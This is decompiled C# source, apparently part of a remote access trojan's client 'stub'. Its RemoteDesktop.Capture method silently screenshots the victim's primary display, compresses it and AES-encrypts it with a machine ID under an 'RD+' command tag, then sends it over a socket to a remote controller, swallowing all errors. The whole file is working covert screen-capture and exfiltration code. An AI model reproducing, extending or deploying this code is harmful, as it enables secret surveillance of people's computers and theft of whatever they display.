using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	// Token: 0x0200000D RID: 13
	public class RemoteDesktop
	{
		// Token: 0x06000049 RID: 73 RVA: 0x000073D4 File Offset: 0x000055D4
		public static void Capture(int W, int H, int qq)
		{
			try
			{
				int width = Screen.PrimaryScreen.Bounds.Width;
				Rectangle bounds = Screen.PrimaryScreen.Bounds;
				Bitmap bitmap = new Bitmap(width, bounds.Height);
				Graphics graphics = Graphics.FromImage(bitmap);
				graphics.CompositingQuality = CompositingQuality.HighSpeed;
				Graphics graphics2 = graphics;
				int sourceX = 0;
				int sourceY = 0;
				int destinationX = 0;
				int destinationY = 0;
				bounds = Screen.PrimaryScreen.Bounds;
				Size size = new Size(bounds.Width, Screen.PrimaryScreen.Bounds.Height);
				graphics2.CopyFromScreen(sourceX, sourceY, destinationX, destinationY, size, CopyPixelOperation.SourceCopy);
				size = new Size(32, 32);
				object obj = size;
				Point position = Cursor.Position;
				object obj2 = obj;
				Size size2;
				bounds = new Rectangle(position, (obj2 != null) ? ((Size)obj2) : size2);
				object obj3 = bounds;
				Cursor @default = Cursors.Default;
				Graphics g = graphics;
				object obj4 = obj3;
				Rectangle rectangle;
				@default.Draw(g, (obj4 != null) ? ((Rectangle)obj4) : rectangle);
				Bitmap bitmap2 = new Bitmap(W, H);
				Graphics graphics3 = Graphics.FromImage(bitmap2);
				graphics3.CompositingQuality = CompositingQuality.HighSpeed;
				Graphics graphics4 = graphics3;
				Image image = bitmap;
				bounds = new Rectangle(0, 0, W, H);
				Rectangle destRect = bounds;
				Rectangle srcRect = new Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
				graphics4.DrawImage(image, destRect, srcRect, GraphicsUnit.Pixel);
				EncoderParameter encoderParameter = new EncoderParameter(Encoder.Quality, (long)qq);
				ImageCodecInfo encoderInfo = RemoteDesktop.GetEncoderInfo(ImageFormat.Jpeg);
				EncoderParameters encoderParameters = new EncoderParameters(1);
				encoderParameters.Param[0] = encoderParameter;
				MemoryStream memoryStream = new MemoryStream();
				bitmap2.Save(memoryStream, encoderInfo, encoderParameters);
				try
				{
					Socket s = ClientSocket.S;
					lock (s)
					{
						using (MemoryStream memoryStream2 = new MemoryStream())
						{
							bounds = Screen.PrimaryScreen.Bounds;
							object instance = bounds.Size;
							byte[] array = Helper.AES_Encryptor(Helper.SB(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject("RD+", ClientSocket.SPL), Helper.BS(memoryStream.ToArray())), ClientSocket.SPL), NewLateBinding.LateGet(instance, null, "Width", new object[0], null, null, null)), ClientSocket.SPL), NewLateBinding.LateGet(instance, null, "Height", new object[0], null, null, null)), ClientSocket.SPL), Helper.ID()))));
							byte[] array2 = Helper.SB(Conversions.ToString(array.Length) + "\0");
							memoryStream2.Write(array2, 0, array2.Length);
							memoryStream2.Write(array, 0, array.Length);
							ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
							ClientSocket.S.Send(memoryStream2.ToArray(), 0, checked((int)memoryStream2.Length), SocketFlags.None);
						}
					}
				}
				catch (Exception ex)
				{
					ClientSocket.isConnected = false;
				}
				try
				{
					graphics.Dispose();
					graphics3.Dispose();
					bitmap.Dispose();
					memoryStream.Dispose();
				}
				catch (Exception ex2)
				{
				}
			}
			catch (Exception ex3)
			{
			}
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00007764 File Offset: 0x00005964
		public static ImageCodecInfo GetEncoderInfo(ImageFormat format)
		{
			checked
			{
				ImageCodecInfo result;
				try
				{
					ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
					for (int i = 0; i < imageEncoders.Length; i++)
					{
						if (imageEncoders[i].FormatID == format.Guid)
						{
							return imageEncoders[i];
						}
					}
					result = null;
				}
				catch (Exception ex)
				{
				}
				return result;
			}
		}
	}
}
